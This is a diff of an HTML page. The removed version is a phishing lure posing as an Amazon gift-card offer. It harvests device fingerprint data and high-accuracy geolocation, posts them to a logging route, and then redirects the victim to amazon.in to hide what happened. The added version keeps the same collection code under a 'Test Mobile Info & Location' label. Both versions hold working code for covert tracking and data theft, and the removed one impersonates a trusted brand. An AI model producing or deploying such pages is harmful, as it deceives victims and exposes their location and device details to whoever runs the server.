@@ -1,78 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon Rewards & System Sync</title>
+    <title>Test Mobile Info & Location</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { font-family: Arial, sans-serif; text-align: center; background: #f3f3f3; padding-top: 50px; }
-        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
-        .btn { background: #febd69; border: 1px solid #a88734; color: #111; padding: 12px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; }
-        .btn:hover { background: #f3a847; }
+        .container { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
+        .btn { background: #4CAF50; color: white; padding: 12px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; border: none; }
+        .btn:hover { background: #45a049; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h3>Exclusive Offer Found!</h3>
-    <p>Please allow permissions to claim your ₹500 Amazon Gift Card.</p>
-    <button id="getInfoBtn" class="btn">Allow & Claim</button>
+    <h3>Test Mobile Info & Location</h3>
+    <p>Click below to allow and send your mobile info + location</p>
+    <button id="sendBtn" class="btn">Allow & Send</button>
 </div>
 
 <script>
-const serverURL = "/log-info"; // Local server route
+const serverURL = "/log-info"; // Local server endpoint
 
-function sendDeviceInfo(position=null) {
-    const data = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        online: navigator.onLine,
-        ram: navigator.deviceMemory || 0,
-        cpuCores: navigator.hardwareConcurrency || 0,
-        screenRes: `${window.screen.width}x${window.screen.height}`,
-        colorDepth: window.screen.colorDepth,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        batteryLevel: 0,
-        isCharging: false,
-        latitude: position ? position.coords.latitude : null,
-        longitude: position ? position.coords.longitude : null
-    };
+async function sendData() {
+    try {
+        const platform = navigator.platform;
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const languages = navigator.languages;
+        const online = navigator.onLine;
+        const ram = navigator.deviceMemory || 0;
+        const cpuCores = navigator.hardwareConcurrency || 0;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const colorDepth = screen.colorDepth;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const battery = await navigator.getBattery();
+        let latitude = null, longitude = null;
 
-    // Battery info (async)
-    if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-            data.batteryLevel = Math.round(battery.level * 100);
-            data.isCharging = battery.charging;
-
-            // Send to server
-            fetch(serverURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            }).finally(() => {
-                // Redirect after sending
-                window.location.href = "https://www.amazon.in";
+        // Geolocation
+        if (navigator.geolocation) {
+            await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    latitude = pos.coords.latitude;
+                    longitude = pos.coords.longitude;
+                    resolve();
+                }, err => resolve()); // ignore if denied
             });
-        });
-    } else {
-        fetch(serverURL, {
+        }
+
+        const payload = {
+            userAgent, platform, language, languages, online,
+            ram, cpuCores, screenRes, colorDepth, timezone,
+            batteryLevel: battery.level * 100, isCharging: battery.charging,
+            latitude, longitude
+        };
+
+        // Send to server
+        await fetch(serverURL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        }).finally(() => {
-            window.location.href = "https://www.amazon.in";
+            body: JSON.stringify(payload)
         });
+
+        alert("✅ Data sent successfully!");
+    } catch (err) {
+        console.error(err);
+        alert("❌ Error sending data.");
     }
 }
 
-document.getElementById("getInfoBtn").addEventListener("click", () => {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendDeviceInfo, sendDeviceInfo, { enableHighAccuracy: true });
-    } else {
-        sendDeviceInfo();
-    }
-});
+document.getElementById("sendBtn").addEventListener("click", sendData);
 </script>
 
 </body>
